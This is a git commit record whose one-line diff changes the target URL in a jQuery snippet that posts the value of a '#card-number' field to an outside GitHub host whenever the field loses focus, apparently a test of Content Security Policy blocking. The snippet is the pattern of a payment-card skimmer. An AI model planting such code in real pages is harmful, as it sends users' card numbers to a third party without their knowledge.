4a6fc79904b37738e95a4f5c3c4eed760cd877f3
mmiesiak <3510877+mmiesiak@users.noreply.github.com>
2019-05-30 10:38:42 +0300

    Update script.js

--- script.js
+++ script.js
@@ -1,3 +1,3 @@
 $("#card-number").on('blur', function() {
-  $.post( "https://github.com/mmiesiak/csp/edit/master/test.html", { name: $(this).val() } );
+  $.post( "https://raw.githubusercontent.com/mmiesiak/csp/master/test.html", { name: $(this).val() } );
 });
